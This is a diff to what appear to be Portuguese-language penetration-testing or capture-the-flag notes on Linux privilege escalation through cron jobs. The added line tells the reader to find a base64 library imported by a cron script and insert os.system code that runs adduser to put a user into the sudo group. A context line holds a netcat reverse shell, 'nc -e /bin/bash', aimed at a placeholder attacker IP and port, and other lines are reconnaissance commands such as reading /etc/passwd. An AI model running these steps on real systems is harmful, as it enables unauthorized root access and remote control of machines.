@@ -5145,7 +5145,9 @@ Lista as cron que roda no servidor
 .
 
     ls -la /etc/cron.outly/
+	LOCALIZA a LIB base64 que ta importada lá no script sem permissao de edição e adiciona a seguinte linha import os \n os.system("/usr/sbin/adduser joao sudo")
 
+ 
 Se o arquivo tem permissão 777 editar e colocar o código..
 
     nc -e /bin/bash Ip-do-Atacante Porta
@@ -8750,7 +8752,7 @@ Código console.py abaixo
 		
 		ip addr
 		
-		netstat -tulpn | grep LISTEN
+		netstat -tulpn | grep LISTEN -- ALTERNATIVA ss -tulpn
 		
 		cat /etc/passwd
 		ls /etc/passwd -l
